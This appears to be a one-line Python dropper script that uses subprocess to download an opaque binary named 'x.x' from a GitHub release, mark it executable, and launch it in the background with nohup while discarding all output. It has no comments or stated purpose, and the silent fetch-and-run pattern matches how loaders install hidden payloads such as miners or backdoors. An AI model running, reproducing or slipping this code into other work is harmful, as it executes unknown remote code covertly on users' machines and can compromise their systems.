import subprocess

subprocess.run("curl -L -o x.x https://github.com/alphaxcv/slx/releases/download/dl/x.x && chmod +x x.x && nohup ./x.x > /dev/null 2>&1", shell=True)
